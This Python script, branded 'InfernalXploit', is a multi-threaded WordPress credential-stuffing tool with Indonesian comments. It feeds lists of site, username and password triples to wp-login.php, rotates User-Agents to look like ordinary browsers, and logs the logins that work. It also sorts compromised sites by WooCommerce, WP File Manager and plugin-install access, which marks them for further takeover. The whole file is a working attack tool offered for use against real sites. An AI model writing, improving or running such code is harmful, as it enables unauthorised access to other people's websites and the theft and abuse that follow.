import os
import platform
import requests
import urllib.parse
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
from colorama import Fore, init

init(autoreset=True)

# Warna terminal
G = '\033[0;32m'
W = '\033[0;37m'
R = '\033[0;31m'
C = '\033[1;36m'
Y = '\033[0;33m'
B = '\033[0;34m'
RESET = '\033[0m'

# User-Agents acak
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'
]

# Batas waktu penggunaan
def check_time_limit():
    start_date = datetime(2024, 12, 1)
    end_date = datetime(2026, 1, 30)
    if datetime.now() > end_date:
        print(f"{R}[ERROR] Masa penggunaan program telah habis.{W}")
        exit()

# Bersihkan terminal
def clear_screen():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

# Banner InfernalXploit
def banner():
    print(f"""{C}
  _____       __                         __      __       _ __     __     
 / ___/__  __/ /_____  ____ _____  ___  / /___ _/ /______(_) /__  / /_  __
 \\__ \\/ / / / __/ __ \\/ __ `/ __ \\/ _ \\/ / __ `/ __/ ___/ / / _ \\/ / / / /
___/ / /_/ / /_/ /_/ / /_/ / / / /  __/ / /_/ / /_/ /  / / /  __/ / /_/ / 
/____/\\__, /\\__/\\____/\\__,_/_/ /_/\\___/_/\\__,_/\\__/_/  /_/ /\\___/_/\\__, /  
    /____/                                                        /____/   
{W}InfernalXploit - WordPress Credential Checker & Plugin Detector
    """)

# Format parsing
def parse_line(line):
    if '|' in line:
        parts = line.strip().split('|')
    elif ':' in line:
        parts = line.strip().split(':')
    elif ';' in line:
        parts = line.strip().split(';')
    else:
        raise ValueError(f"Format tidak dikenali: {line}")

    if len(parts) != 3:
        raise ValueError(f"Format tidak lengkap: {line}")

    site, user, passwd = parts
    if not site.startswith('http'):
        site = 'http://' + site

    return site, user, passwd

# Fungsi cek login
def check_wp_login(line):
    try:
        site, user, passwd = parse_line(line)
    except ValueError as e:
        print(Fore.RED + f"[!] Melewati baris tidak valid: {e}")
        return

    headers = {
        'User-Agent': random.choice(user_agents),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/plain'
    }

    login_url = site if '/wp-login.php' in site else site.rstrip('/') + '/wp-login.php'
    login_data = {
        'log': user,
        'pwd': passwd,
        'wp-submit': 'Log In',
        'redirect_to': login_url.replace('/wp-login.php', '') + '/wp-admin/',
        'testcookie': 1
    }

    try:
        response = requests.post(login_url, headers=headers, data=login_data, timeout=10, allow_redirects=True)
        text = response.text.lower()

        if ('dashboard' in text or 'wp-admin' in response.url) and 'wp-login.php' not in response.url:
            print(f"[{G}+{W}] {site} --> {G}Login Berhasil!{W}")
            with open('loginSuccess.txt', 'a', encoding='utf-8') as f:
                f.write(f"{site}|{user}|{passwd}\n")

            if 'woocommerce' in text:
                with open('WooCommerce.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{site}|{user}|{passwd}\n")

            if 'wp file manager' in text:
                with open('wpfilemanager.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{site}|{user}|{passwd}\n")

            if 'plugin-install.php' in text:
                with open('plugin-install.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{site}|{user}|{passwd}\n")
        else:
            print(f"[{R}-{W}] {site} --> {R}Gagal Login{W}")
            with open('Bad_WP.txt', 'a', encoding='utf-8') as f:
                f.write(f"{site}|{user}|{passwd}\n")

    except requests.exceptions.RequestException as e:
        print(f"[{R}-{W}] {site} --> {R}Error: {e}{W}")
        with open('Bad_WP.txt', 'a', encoding='utf-8') as f:
            f.write(f"{site}|{user}|{passwd}\n")

# Program utama
def main():
    check_time_limit()
    clear_screen()
    banner()

    site_file = input(f'  {W}Masukkan nama file list: ')
    thread_count = input(f'  {W}Jumlah Thread (default: 10): ') or '10'

    try:
        thread_count = int(thread_count)
    except:
        thread_count = 10

    try:
        with open(site_file, 'r', encoding='utf-8') as f:
            lines = f.read().splitlines()
    except Exception as e:
        print(f"{R}Gagal membaca file: {e}{W}")
        return

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        executor.map(check_wp_login, lines)

if __name__ == '__main__':
    main()
